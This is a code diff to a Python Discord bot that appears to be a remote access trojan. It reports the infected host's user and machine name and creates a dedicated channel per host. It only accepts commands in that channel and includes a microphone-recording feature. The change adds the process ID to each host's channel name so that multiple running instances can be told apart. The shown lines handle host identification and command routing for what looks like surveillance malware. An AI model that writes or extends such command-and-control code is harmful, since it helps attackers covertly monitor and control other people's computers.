@@ -28,11 +28,12 @@ blocker = None
 def get_current_userAndMachine():
     user = os.getlogin()
     machine = platform.node()
-    return user, machine
+    pid = os.getpid()
+    return user, machine, pid
 
 async def who(ctx: commands.Context):
-    user, machine = get_current_userAndMachine()
-    await ctx.send(f"**current user:**\n```\n{user}\n```**current machine:**\n```\n{machine}\n```")
+    user, machine, pid = get_current_userAndMachine()
+    await ctx.send(f"**current user:**\n```\n{user}\n```**current machine:**\n```\n{machine}\n```**current pid:**\n```\n{str(pid)}\n```")
 
 async def hello(ctx: commands.Context):
     await ctx.send(f"hello, welcome! {ctx.author.mention}")
@@ -433,8 +434,8 @@ async def stoprecord(ctx: commands.Context):
         await ctx.send("no active mic recording session here!")
 
 async def MakeandJoinGuild(guild):
-    bot_user, bot_system = get_current_userAndMachine()
-    formatted_name = f"{bot_user}_{bot_system}".lower().replace(" ", "-")
+    bot_user, bot_system, bot_pid = get_current_userAndMachine()
+    formatted_name = f"{bot_user}_{bot_system}{str(bot_pid)}".lower().replace(" ", "-")
     existing_ch = discord.utils.get(guild.text_channels, name=formatted_name)
 
     if not existing_ch:
@@ -658,8 +659,8 @@ async def on_message(message):
     if message.author == bot.user:
         return
 
-    bot_user, bot_machine = get_current_userAndMachine()
-    formatted_name = f"{bot_user}_{bot_machine}".lower().replace(" ", "-")
+    bot_user, bot_machine, bot_pid = get_current_userAndMachine()
+    formatted_name = f"{bot_user}_{bot_machine}{str(bot_pid)}".lower().replace(" ", "-")
     if message.channel.name != formatted_name:
         return
     
